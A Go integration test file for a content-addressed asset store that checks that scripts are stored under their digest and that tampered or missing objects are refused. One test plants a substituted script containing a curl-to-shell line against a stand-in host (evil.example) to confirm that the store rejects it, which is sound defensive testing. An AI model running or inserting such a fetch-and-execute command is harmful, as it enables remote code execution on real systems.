package assetblob_test

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"

	"github.com/compgenlab/varianthub-web/internal/assetblob"
	"github.com/compgenlab/varianthub-web/internal/catalog"
)

// newStore builds a catalog against a throwaway schema with one path storage
// location, and returns it wrapped so assets land in dir.
//
// Path storage rather than S3 on purpose: it exercises the same code with no
// external dependency, and it is the case where a bad digest would escape onto
// the filesystem.
func newStore(t *testing.T) (*catalog.Store, string) {
	t.Helper()
	dsn := os.Getenv("VHW_TEST_DATABASE_URL")
	if dsn == "" {
		t.Skip("VHW_TEST_DATABASE_URL not set; skipping asset storage integration tests")
	}
	ctx := context.Background()

	files, err := filepath.Glob("../../migrations/*.sql")
	if err != nil || len(files) == 0 {
		t.Fatalf("no migrations found: %v", err)
	}
	sort.Strings(files)
	var ddl strings.Builder
	for _, f := range files {
		b, err := os.ReadFile(f)
		if err != nil {
			t.Fatal(err)
		}
		ddl.Write(b)
		ddl.WriteString("\n")
	}

	schema := fmt.Sprintf("ab_%d", time.Now().UnixNano())
	setup, err := pgxpool.New(ctx, dsn)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := setup.Exec(ctx, `CREATE SCHEMA `+schema); err != nil {
		setup.Close()
		t.Fatal(err)
	}
	if _, err := setup.Exec(ctx, `SET search_path TO `+schema+`; `+ddl.String()); err != nil {
		setup.Close()
		t.Fatal(err)
	}
	setup.Close()

	pool, err := pgxpool.New(ctx, dsn+"&search_path="+schema)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if drop, err := pgxpool.New(context.Background(), dsn); err == nil {
			_, _ = drop.Exec(context.Background(), `DROP SCHEMA `+schema+` CASCADE`)
			drop.Close()
		}
		pool.Close()
	})

	dir := t.TempDir()
	cat := catalog.New(pool)
	if err := cat.PutStorage(ctx, catalog.StorageLocation{
		ID: "local", Name: "local", Kind: catalog.StoragePath, URI: dir, IsDefault: true,
	}); err != nil {
		t.Fatal(err)
	}
	return cat.WithAssetBlobs(assetblob.New(cat)), dir
}

// The end-to-end shape: content goes to storage under its digest, the database
// keeps only the index, and reading it back returns the original bytes.
func TestAssetLandsInStorageUnderItsDigest(t *testing.T) {
	s, dir := newStore(t)
	ctx := context.Background()

	if err := s.PutSource(ctx, catalog.Source{
		ID: "revel", Name: "revel", Version: "1.3", Kind: "tab", TOML: "[[sources]]\n",
	}); err != nil {
		t.Fatal(err)
	}
	const script = "#!/usr/bin/env python3\nprint('convert')\n"
	if err := s.PutAssets(ctx, "revel", []catalog.Asset{{Name: "convert.py", Content: script}}); err != nil {
		t.Fatal(err)
	}

	digest := catalog.AssetDigest([]byte(script))
	obj := filepath.Join(dir, assetblob.Prefix, digest)
	got, err := os.ReadFile(obj)
	if err != nil {
		t.Fatalf("asset not written to storage at %s: %v", obj, err)
	}
	if string(got) != script {
		t.Errorf("stored bytes differ from the asset")
	}
	// No leftover from the write-then-rename.
	if _, err := os.Stat(obj + ".part"); err == nil {
		t.Errorf("a .part file was left behind at %s", obj+".part")
	}

	inline, err := s.InlineAssets(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if len(inline) != 0 {
		t.Errorf("content stayed in Postgres: %+v", inline)
	}

	back, err := s.Assets(ctx, "revel")
	if err != nil {
		t.Fatal(err)
	}
	if len(back) != 1 || back[0].Content != script {
		t.Fatalf("round trip = %+v", back)
	}
}

// The reason for naming an object by its content: substitute the object and the
// fetch must refuse it. Asserted against the real store rather than a double,
// because a test double that verifies proves only that the double verifies.
//
// It matters concretely — these bytes are written into a job's config tree and
// executed by a build step, so anyone who can write to the bucket could
// otherwise swap a conversion script for anything they liked.
func TestSubstitutedObjectIsRefused(t *testing.T) {
	s, dir := newStore(t)
	ctx := context.Background()

	if err := s.PutSource(ctx, catalog.Source{
		ID: "revel", Name: "revel", Version: "1.3", Kind: "tab", TOML: "[[sources]]\n",
	}); err != nil {
		t.Fatal(err)
	}
	const script = "#!/bin/sh\necho trusted\n"
	if err := s.PutAssets(ctx, "revel", []catalog.Asset{{Name: "convert.py", Content: script}}); err != nil {
		t.Fatal(err)
	}

	obj := filepath.Join(dir, assetblob.Prefix, catalog.AssetDigest([]byte(script)))
	if err := os.WriteFile(obj, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	got, err := s.Assets(ctx, "revel")
	if err == nil {
		t.Fatalf("a substituted object was handed back: %+v", got)
	}
	if !strings.Contains(err.Error(), "convert.py") {
		t.Errorf("error does not name the asset: %v", err)
	}
}

// An object that vanished must be a clear error, not an empty script that a
// build step runs and silently produces nothing from.
func TestMissingObjectIsAnError(t *testing.T) {
	s, dir := newStore(t)
	ctx := context.Background()

	if err := s.PutSource(ctx, catalog.Source{
		ID: "revel", Name: "revel", Version: "1.3", Kind: "tab", TOML: "[[sources]]\n",
	}); err != nil {
		t.Fatal(err)
	}
	const script = "#!/bin/sh\necho hi\n"
	if err := s.PutAssets(ctx, "revel", []catalog.Asset{{Name: "convert.py", Content: script}}); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(filepath.Join(dir, assetblob.Prefix,
		catalog.AssetDigest([]byte(script)))); err != nil {
		t.Fatal(err)
	}

	if got, err := s.Assets(ctx, "revel"); err == nil {
		t.Fatalf("a missing object returned %+v with no error", got)
	}
}

// Re-registering identical content does not rewrite the object, and a corrupted
// one is repaired rather than left for the read side to keep refusing.
//
// Both halves come from the same choice: PutAsset checks what is there instead
// of trusting that something is.
func TestRegisteringAgainSkipsOrRepairs(t *testing.T) {
	s, dir := newStore(t)
	ctx := context.Background()

	if err := s.PutSource(ctx, catalog.Source{
		ID: "revel", Name: "revel", Version: "1.3", Kind: "tab", TOML: "[[sources]]\n",
	}); err != nil {
		t.Fatal(err)
	}
	const script = "#!/bin/sh\necho hi\n"
	put := func() {
		t.Helper()
		if err := s.PutAssets(ctx, "revel",
			[]catalog.Asset{{Name: "convert.py", Content: script}}); err != nil {
			t.Fatal(err)
		}
	}
	put()

	obj := filepath.Join(dir, assetblob.Prefix, catalog.AssetDigest([]byte(script)))
	before, err := os.Stat(obj)
	if err != nil {
		t.Fatal(err)
	}

	// Unchanged content: the object must not be rewritten. A read-only file
	// makes that concrete — a write would fail rather than merely be wasteful.
	if err := os.Chmod(obj, 0o444); err != nil {
		t.Fatal(err)
	}
	put()
	if err := os.Chmod(obj, 0o644); err != nil {
		t.Fatal(err)
	}
	after, err := os.Stat(obj)
	if err != nil {
		t.Fatal(err)
	}
	if !after.ModTime().Equal(before.ModTime()) {
		t.Errorf("identical content was written again (mtime moved)")
	}

	// Corrupted: re-registering repairs it, so the source becomes usable again
	// without anyone having to know an object needs deleting by hand.
	if err := os.WriteFile(obj, []byte("tampered\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := s.Assets(ctx, "revel"); err == nil {
		t.Fatal("the tampered object was accepted, so this test proves nothing")
	}
	put()
	back, err := s.Assets(ctx, "revel")
	if err != nil {
		t.Fatalf("re-registering did not repair the object: %v", err)
	}
	if len(back) != 1 || back[0].Content != script {
		t.Errorf("after repair: %+v", back)
	}
}
